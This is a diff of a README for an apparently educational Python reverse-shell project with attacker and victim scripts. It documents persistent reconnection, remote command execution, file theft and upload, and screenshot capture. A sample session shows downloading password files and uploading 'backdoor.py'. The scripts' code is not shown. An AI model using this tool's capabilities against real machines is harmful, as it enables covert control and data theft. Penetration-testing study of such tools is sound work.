@@ -1,8 +1,10 @@
 # 🚀 Advanced Python Reverse Shell
 
-This **advanced version** of the Python reverse shell is a powerful upgrade over the basic version, designed with reliability, extended capabilities, and operational stealth in mind. It maintains the simplicity of Python while introducing features critical for realistic penetration testing and red teaming exercises.
+This **advanced reverse shell** is a robust upgrade over the basic version — designed for **realistic red teaming**, **persistent control**, and **hands-on ethical hacking practice**.
 
-Unlike the basic version — which provides core command execution and a linear connection — this version ensures persistent communication, intelligent command handling, **file transfers**, **remote screenshot capture with automatic download**, and graceful session management, making it a practical tool for ethical hackers.
+Built entirely in Python, it supports reliable reconnections, file transfers, screenshot capture, and cleaner command handling — all while maintaining code clarity and modularity for learning.
+
+> ⚠️ For authorized educational use only. Do not run this on unauthorized systems or networks.
 
 ---
 
@@ -10,130 +12,104 @@ Unlike the basic version — which provides core command execution and a linear 
 
 | Feature                        | Basic Version                    | Advanced Version                                                       |
 |-------------------------------|----------------------------------|------------------------------------------------------------------------|
-| Persistent Reconnect          | ❌ Single connection attempt      | ✅ Reconnects every 5 seconds if listener is offline                   |
-| File Download                 | ❌ Not supported                  | ✅ Substring-based listing and exact match download                    |
-| File Upload                   | ❌ Not supported                  | ✅ From hacker to victim; handles non-existent/empty files             |
-| Screenshot Capture            | ❌ Not supported                  | ✅ Captures screen, auto-downloads to hacker, deletes on victim        |
-| Directory Navigation (`cd`)   | ✅ Supported                      | ✅ Improved with echoing and default display                           |
-| Command Output Handling       | ⚠️ Limited fallback              | ✅ Cross-platform decoding (`cp437`/`utf-8`) with error resilience     |
-| Empty Command Output Handling | ❌ No feedback                    | ✅ "No output" message returned                                        |
-| Graceful Exit (`stop`)        | ✅ Supported                      | ✅ Clean shutdown of both ends                                         |
-| Socket Reuse (`SO_REUSEADDR`) | ❌ Not handled                    | ✅ Enables fast restarts without port bind errors                      |
+| Persistent Reconnect          | ❌ Single attempt                 | ✅ Retries every 5 seconds if listener offline                         |
+| File Download                 | ❌ Not supported                  | ✅ Substring match, filename confirmation, binary download             |
+| File Upload                   | ❌ Not supported                  | ✅ Supports 0-byte and error handling                                  |
+| Screenshot Capture            | ❌ Not supported                  | ✅ Remote capture + auto-delete + timestamped filename                 |
+| Directory Navigation (`cd`)   | ✅ Supported                      | ✅ Echo current directory, cross-platform                              |
+| Output Encoding               | ⚠️ Limited                       | ✅ CP437/UTF-8 auto-fallback, safe decode                              |
+| No Output Feedback            | ❌ No feedback                    | ✅ "Command executed successfully" response                            |
+| Graceful Exit (`stop`)        | ✅ Supported                      | ✅ Closes both scripts cleanly                                         |
+| Socket Reuse (`SO_REUSEADDR`) | ❌ No                            | ✅ Prevents "port in use" errors                                       |
 
 ---
 
-## 📁 Directory Contents
+## 📁 Folder Structure
 
 ```
 
 Advanced-Version/
-├── README.md             # You are here
-├── advanced_hacker.py    # Attacker script (listener + command handler)
-└── advanced_victim.py    # Victim payload (persistent reverse shell)
+├── README.md             # Tool documentation
+├── advanced_hacker.py    # Listener with command + file support
+└── advanced_victim.py    # Victim payload with persistent reconnect
 
 ````
 
 ---
 
-## 💡 Core Features
+## ✨ Features Overview
 
-- **🔁 Persistent Reconnect**: Victim retries connection to the hacker every 5 seconds until successful.
-- **💻 Command Execution**: Cross-platform shell support using `subprocess.check_output()`.
-- **📂 Directory Navigation (`cd`)**: 
-  - `cd` alone → shows current directory.
-  - `cd <path>` → changes directory and echoes confirmation.
-- **📥 File Download**:
-  - `download <name_or_prefix>` lists files if no extension is given.
-  - Choose exact match to trigger download.
-- **📤 File Upload**:
-  - Uploads file from hacker to victim.
-  - Sends 0-byte flag if file is missing or empty.
-- **🖼️ Screenshot Capture + Auto-Download**:
-  - `screenshot` command triggers remote screen capture.
-  - File auto-saved on hacker with a timestamped filename like `screenshot-YYYY-MM-DD_HH-MM-SS.png`.
-  - Victim deletes the local screenshot post-transfer.
-- **🛑 Graceful Termination**: `stop` shuts down both hacker and victim scripts cleanly.
-- **📡 Port Reuse**: Hacker uses `SO_REUSEADDR` to allow quick listener restarts.
-- **⚙️ File Protocol**:
-  - Binary transfers with 8-byte size header.
-  - 0-byte signals special states like "file not found" or "empty".
+- 🔁 **Persistent Reconnect**  
+- 💻 **Remote Command Execution**  
+- 📂 **Directory Navigation (`cd`)**  
+- 📥 **File Download** (auto-listing for name prefixes)  
+- 📤 **File Upload** (with 0-byte detection)  
+- 🖼️ **Screenshot Capture + Auto-Download**  
+- 🛑 **Graceful Session Termination**  
+- 📡 **Port Reuse with `SO_REUSEADDR`**  
+- ⚙️ **File Protocol with 8-byte headers**  
+- 🔐 **Cross-platform Encoding Handling**
 
 ---
 
-## 🚀 Usage Guide
+## 🚀 Usage
 
 ### 🔧 Step 1: Configure IP & Port
 
-In both scripts, set:
+In both `advanced_hacker.py` and `advanced_victim.py`:
 
 ```python
 hacker_ip = "YOUR_ATTACKER_IP"
 hacker_port = 10000
 ````
 
-Use `ip a` (Linux) or `ipconfig` (Windows) to find your local IP.
+> Use `ipconfig` (Windows) or `ip a` (Linux) to find your IP address
 
 ---
 
-### 🧠 Step 2: Start Hacker (Listener)
+### 🧠 Step 2: Start Listener (Attacker)
 
 ```bash
 python3 advanced_hacker.py
 ```
 
-Wait for an incoming connection.
-
----
-
 ### 👾 Step 3: Run Victim
 
-On the target/victim machine:
+On the victim machine:
 
 ```bash
 python3 advanced_victim.py
 ```
 
-The victim will keep attempting to connect every 5 seconds.
+Victim retries connection every 5 seconds.
 
 ---
 
 ## 💬 Command Reference
 
-| Command                     | Description                                                                 |
-| --------------------------- | --------------------------------------------------------------------------- |
-| `cd`                        | Show current directory                                                      |
-| `cd <path>`                 | Change directory to `<path>`                                                |
-| `download <name or prefix>` | Download file. If no extension, shows matches (e.g., `pass_` → lists files) |
-| `upload <filename>`         | Upload a file from hacker to victim                                         |
-| `screenshot`                | Capture and auto-download victim's screen                                   |
-| `stop`                      | Cleanly terminates the session                                              |
-| Any other shell command     | Executes directly on victim and returns output                              |
+| Command             | Description                                                  |                                                        |
+| ------------------- | ------------------------------------------------------------ | ------------------------------------------------------ |
+| `cd`, `cd <path>`   | Navigate directories or show current directory               |                                                        |
+| \`download \<prefix | name>\`                                                      | List matches if partial; exact match triggers download |
+| `upload <filename>` | Upload file to victim from attacker machine                  |                                                        |
+| `screenshot`        | Remote screen capture (PNG auto-saved & deleted from victim) |                                                        |
+| `stop`              | Clean shutdown of both scripts                               |                                                        |
+| Any shell command   | Executed and output is returned                              |                                                        |
 
 ---
 
-## 📌 Sample Session
-
-**Attacker Terminal:**
+## 📌 Example Session
 
 ```bash
-python3 advanced_hacker.py
-Listening for incoming connections...
-[+] Connected with ('192.168.0.105', 50832)
-
-> whoami
-victim-pc\user
-
 > cd Desktop
 Changed directory to Desktop
 
 > download pass_
 All files with (pass_) name!
-  [+] pass_info.txt
   [+] pass_list.docx
-Type the exact file name (with extension!)
+  [+] pass_info.txt
 
 > download pass_list.docx
-Yes, the file (pass_list.docx) exists!
 Receiving file (38290 bytes)...
 pass_list.docx downloaded successfully!
 
@@ -142,65 +118,41 @@ backdoor.py uploaded successfully!
 
 > screenshot
 Screenshot saved as screenshot-2025-06-03_08-00-00.png
-Receiving file (95000 bytes)...
-Screenshot downloaded successfully!
 File also removed from victim!
 
 > stop
 [*] Session terminated. Exiting.
 ```
 
-**Victim Terminal (illustrative):**
+---
 
-```
-[*] Connected to hacker.
-whoami is executed successfully!
-cd Desktop is executed successfully!
-download pass_ is executed successfully!
-download pass_list.docx is executed successfully!
-upload backdoor.py is executed successfully!
-Receiving file [backdoor.py] (1024 bytes)...
-[*] File 'backdoor.py' received and saved successfully.
-screenshot is executed successfully!
-File also removed from victim!
-stop is executed successfully!
-```
+## 🔬 Technical Insights
+
+* 🔄 **Persistent loop**: Victim reconnects forever until success
+* 🧠 **Command parser**: Smart logic for `cd`, `download`, `upload`, `stop`, and fallback shell
+* 📦 **File transfer**: 8-byte file size header + binary chunks
+* ✍️ **Encoding**: `cp437` (Windows) / `utf-8` (Linux), with fallback
 
 ---
 
-## 🧪 Technical Internals
+## 🔐 Legal & Ethical Disclaimer
 
-### 🔄 Persistent Connection Loop
+This software is provided for **educational and authorized cybersecurity practice only**.
+Running it on systems or networks you do not **own or have explicit written permission to test** is illegal.
 
-Victim loops forever until it establishes a connection with the hacker.
-
-### ⚙️ Command Dispatch Logic
-
-The victim parses and handles:
-
-* `cd`
-* `download`
-* `upload`
-* `screenshot`
-* `stop`
-* Anything else → executed in shell via `subprocess.check_output()`
-
-### 📁 File Transfer Protocol
-
-* Binary file data.
-* Every file transfer begins with an **8-byte file size header**.
-* Size = `0` is used to indicate error conditions (e.g., "not found").
-
-### 🧬 Encoding Strategy
-
-* Windows: `cp437`
-* Linux/macOS: `utf-8`
-* Fallback: `errors='replace'` to handle special characters safely.
+> The author assumes **no liability** for any misuse or damage caused.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## 🔗 Navigation
 
-This tool is intended **solely for educational use** and authorized ethical hacking engagements. **Do not use this software on networks or devices you do not own or have explicit permission to test.** Unauthorized access is illegal. The author assumes no liability for misuse.
+- ⬅️ [Back to Reverse Shell Overview](../README.md)
+- ⬅️ [Back to All Tools](../../../README.md)
+- 🔹 [Go to Basic Version](../Basic-Version/README.md)
 
 ---
+
+## 👨‍💻 Author
+
+**Muhammad Rehan Rashid**
+🧠 GitHub Alias: [`C0de-N1nja`](https://github.com/C0de-N1nja)
